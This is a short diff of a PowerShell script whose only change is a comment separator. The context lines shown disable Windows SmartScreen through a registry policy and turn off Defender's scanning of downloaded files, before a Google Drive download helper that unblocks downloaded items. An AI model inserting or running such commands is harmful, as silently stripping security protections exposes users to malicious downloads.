@@ -5,7 +5,7 @@ if (!(Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System")) {
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Type DWord -Value 0 -Force
 Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
 Write-Host "SmartScreen policy disabled and downloaded-file scanning relaxed." -ForegroundColor Green
-# ==========================================
+# =========================================
 # Google Drive Download Helper Function
 # ==========================================
 function Unblock-DownloadedItem {
